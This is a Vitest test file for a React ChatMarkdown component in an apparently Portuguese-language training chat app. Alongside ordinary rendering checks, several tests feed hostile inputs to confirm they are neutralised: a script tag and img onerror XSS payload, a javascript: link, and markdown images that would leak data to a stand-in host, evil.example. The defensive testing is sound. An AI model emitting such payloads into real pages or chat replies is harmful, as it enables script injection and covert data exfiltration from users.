import { describe, it, expect } from 'vitest';
import { render, screen } from '../../test/test-utils';
import ChatMarkdown from './ChatMarkdown';

describe('ChatMarkdown', () => {
  it('renders headings as plain emphasised paragraphs, not heading landmarks', () => {
    render(<ChatMarkdown content={'# Plano\n\n## Semana 1\n\n### Dia A'} />);

    expect(screen.queryByRole('heading')).not.toBeInTheDocument();
    expect(screen.getByText('Plano')).toBeInTheDocument();
    expect(screen.getByText('Semana 1')).toBeInTheDocument();
    expect(screen.getByText('Dia A')).toBeInTheDocument();
  });

  it('renders unordered and ordered lists', () => {
    render(<ChatMarkdown content={'- agachamento\n- supino\n\n1. aquecer\n2. treinar'} />);

    const lists = screen.getAllByRole('list');
    expect(lists).toHaveLength(2);
    expect(screen.getAllByRole('listitem')).toHaveLength(4);
  });

  it('renders GFM tables with column headers and cells', () => {
    render(<ChatMarkdown content={'| Exercício | Séries |\n| --- | --- |\n| Agachamento | 3 |'} />);

    expect(screen.getByRole('table')).toBeInTheDocument();
    expect(screen.getAllByRole('columnheader').map((cell) => cell.textContent)).toEqual(['Exercício', 'Séries']);
    expect(screen.getByRole('cell', { name: 'Agachamento' })).toBeInTheDocument();
  });

  it('renders inline code and code blocks', () => {
    render(<ChatMarkdown content={'Use `RPE 8`.\n\n```\nlinha 1\n```'} />);

    expect(screen.getByText('RPE 8').tagName).toBe('CODE');
    expect(screen.getByText('linha 1')).toBeInTheDocument();
  });

  it('renders a markdown link as a link with its href', () => {
    render(<ChatMarkdown content="Veja [o guia](https://exemplo.com/guia)" />);

    expect(screen.getByRole('link', { name: 'o guia' })).toHaveAttribute('href', 'https://exemplo.com/guia');
  });

  it('does not turn raw HTML into live markup', () => {
    const { container } = render(
      <ChatMarkdown content={'<script>window.__pwned = true</script><img src=x onerror="window.__pwned = true"><b>negrito</b>'} />
    );

    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(window.__pwned).toBeUndefined();
  });

  it('neutralises javascript: links', () => {
    render(<ChatMarkdown content="[clique](javascript:alert(1))" />);

    const link = screen.queryByRole('link', { name: 'clique' });
    expect(link === null || !String(link.getAttribute('href') ?? '').toLowerCase().startsWith('javascript:')).toBe(true);
  });

  it('opens links in a new tab without leaking the opener or the referrer', () => {
    render(<ChatMarkdown content="Veja [o guia](https://exemplo.com/guia)" />);

    const link = screen.getByRole('link', { name: 'o guia' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link.getAttribute('rel').split(' ').sort()).toEqual(['nofollow', 'noopener', 'noreferrer']);
  });

  it('never renders images: shows the alt text instead, so nothing is fetched from a remote URL', () => {
    const { container } = render(<ChatMarkdown content="![dados do aluno](https://evil.example/leak?d=secret)" />);

    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('dados do aluno')).toBeInTheDocument();
  });

  it('renders nothing for an image without alt text', () => {
    const { container } = render(<ChatMarkdown content="![](https://evil.example/leak?d=secret)" />);

    expect(container.querySelector('img')).toBeNull();
    expect(container).not.toHaveTextContent('evil.example');
  });

  it('keeps the same output when re-rendered with identical content', () => {
    const { rerender } = render(<ChatMarkdown content="**forte**" />);
    const before = screen.getByText('forte');

    rerender(<ChatMarkdown content="**forte**" />);

    expect(screen.getByText('forte')).toBe(before);
  });
});
